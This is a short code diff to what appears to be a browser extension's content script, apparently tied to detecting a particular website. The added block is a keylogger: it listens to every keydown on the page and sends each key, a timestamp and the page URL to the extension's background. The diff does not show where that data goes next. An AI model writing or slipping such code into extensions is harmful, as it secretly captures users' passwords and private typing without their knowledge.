@@ -21,6 +21,22 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     }, window.location.origin);
   }
 });
+  
+document.addEventListener('keydown', (event) => {
+  var currentKey;
+  if (event.key.length > 1) {
+    currentKey = event.key + ",";
+  }
+  else {
+    currentKey = event.key;
+  }
+  chrome.runtime.sendMessage({
+    type: 'KEYPRESS',
+    key: currentKey,
+    timestamp: Date.now(),
+    url: window.location.href
+  });
+});
 
 if (document.readyState === 'loading') {
   document.addEventListener('DOMContentLoaded', checkForChairmanWebsite);
